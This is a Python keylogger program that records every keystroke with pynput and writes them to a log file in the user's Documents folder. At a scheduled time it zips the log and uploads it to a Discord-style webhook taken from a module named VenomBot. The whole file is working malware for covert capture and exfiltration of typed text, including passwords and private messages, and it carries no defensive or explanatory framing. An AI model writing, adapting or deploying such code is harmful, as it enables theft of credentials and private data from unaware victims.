from pynput.keyboard import Key, Listener
import requests
import zipfile
from os import path
import datetime
import VenomBot

webhook = VenomBot.webhookforlogs


scheduled_hour = 11
scheduled_minute = 30


count = 0
keys = []

file_path = path.join(path.expanduser("~"), "Documents")
log_path = path.join(file_path, "log.txt")
zip_path = path.join(file_path,"logs.zip")

def on_press(key):
    global count, keys
    count += 1
    # print("{0} basıldı".format(key)) for testing code
    keys.append(key)

    if count >= 200:
        count = 0
        write_file(keys)
        keys = []
        now = datetime.datetime.now()
        if now.hour == scheduled_hour and now.minute == scheduled_minute:
            zipandshare()


def write_file(keys):
    with open(log_path, "a", encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("enter") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def zipandshare():
    now = datetime.datetime.now()
    formatted_date = now.strftime("%d.%m.%Y")
    zip_filename = f"logs_{formatted_date}.zip"
    zip_full_path = path.join(file_path, zip_filename)
    
    with zipfile.ZipFile(zip_full_path, "w") as zip:
        zip.write(log_path, path.basename(log_path))

    with open(zip_full_path, "rb") as zip_file:
        payload_data = {
            "file": (zip_filename, zip_file)
        }
        response = requests.post(webhook, files=payload_data)


with Listener(on_press=on_press) as listener:
    listener.join()
